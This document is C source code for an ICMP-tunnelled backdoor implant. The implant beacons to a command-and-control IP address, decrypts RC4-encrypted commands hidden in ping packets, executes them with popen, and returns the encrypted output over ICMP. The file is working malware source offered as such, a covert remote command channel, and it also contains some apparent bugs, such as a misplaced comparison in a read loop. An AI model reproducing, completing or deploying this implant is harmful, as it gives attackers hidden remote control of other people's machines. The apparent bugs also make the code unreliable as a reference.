#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "../include/implant.h"
#include "../include/utils.h"

// creates a raw ICMP socket and binds it
int create_socket(void) {
    int sockfd;
    struct icmp_filter filter;

    // create the raw ICMP socket
    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        exit(EXIT_FAILURE);
    }

    // attach a filter to the socket to only catch ICMP_ECHO requests only
    filter.data = ~(1 << ICMP_ECHOREPLY);
    if (setsockopt(sockfd, SOL_RAW, ICMP_FILTER, &filter, sizeof(filter)) < 0) {
        perror("setsockopt()");
        exit(EXIT_FAILURE);
    }

    return sockfd;
}

// runs the command from the C2 and stores it in output, and returns the output size
size_t invoke_command(unsigned char *data, unsigned char *output) {
    FILE *ptr;
    char *command;
    size_t buffer_size, data_section_size = strlen((char *) data);
    unsigned char buffer[BUFFER_SIZE + 6];

    // decrypt the command
    rc4(data, data_section_size, (unsigned char *) KEY, KEY_LENGTH, buffer);

    buffer[data_section_size] = '\0';
    command = strncat((char *) buffer, " 2>&1", 6); // redirect stderr to stdout

    ptr = popen(command, "r");
    if (ptr == NULL) {
        return 0;
    }

    buffer_size = fread(buffer, 1, BUFFER_SIZE, ptr);
    pclose(ptr);

    // encrypt the output
    rc4((unsigned char *) buffer, buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);

    return buffer_size;
}

// sends a beacon to the C2 with the magic byte
int send_beacon(int sockfd, char *dst_ip) {
    struct sockaddr_in dst;
    unsigned char packet[DEFAULT_ICMP_PACKET_SIZE];
    struct icmphdr *icmp = (struct icmphdr *) packet;

    // setting the IP options
    dst.sin_family = AF_INET;
    inet_aton(dst_ip, &dst.sin_addr);

    implant_append_to_data_section(icmp, (unsigned char *) "abcdefghijklmnopqrstuvwabcdefghi");

    implant_prep_icmp_headers(icmp, DEFAULT_ICMP_PACKET_SIZE);

    if ((sendto(sockfd, icmp, DEFAULT_ICMP_PACKET_SIZE, 0, (struct sockaddr *) &dst, sizeof(dst))) < 0) {
        return -1;
    }

    return 1;
}

// the actual interaction occurs here
void interact(int sockfd, char *dest_ip) {
    struct iphdr *ip; // holds the IP header
    struct icmphdr *icmp; // holds the ICMP header
    unsigned char *data; // holds the ICMP's data section
    unsigned char output[BUFFER_SIZE]; // holds the output of the command
    unsigned char packet[PACKET_SIZE]; // holds the packet
    struct sockaddr_in addr;
    size_t nbytes;

    while (1) {
        // send a beacon and wait
        if (send_beacon(sockfd, dest_ip) < 1) {
            return;
        }

        if (!read_from_socket(sockfd, packet, PACKET_SIZE)) {
            return;
        }

        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
        if (check_magic_byte(icmp)) {
            break;
        }
    }

    while (1) {
        if ((nbytes = read_from_socket(sockfd, packet, PACKET_SIZE) < 0)) {
            break;
        }

        ip = (struct iphdr *) packet;
        icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));

        if (check_magic_byte(icmp)) {

            // set the IP & ICMP headers for later usage
            addr = prep_ip_headers(ip);

            // get the data section (ignoring the IP & ICMP headers)
            data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
            data[nbytes - (sizeof(struct iphdr) + sizeof(struct icmphdr))] = '\0';

            // invoke the command
            nbytes = invoke_command(data, output);

            // put the output in the data section of the ICMP packet
            memcpy(data, output, nbytes);

            implant_prep_icmp_headers(icmp, nbytes);

            // send it
            if (sendto(sockfd, icmp, sizeof(struct icmphdr) + nbytes, 0, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
                break;
            }

            // clean up the packet buffer for the next usage
            memset(packet, '\0', PACKET_SIZE);
        }
    }
}

// initializes the options and starts the implant
void implant_init_n_call(char *dest_ip) {
    int sockfd = create_socket();

    interact(sockfd, dest_ip);

    close(sockfd);
}
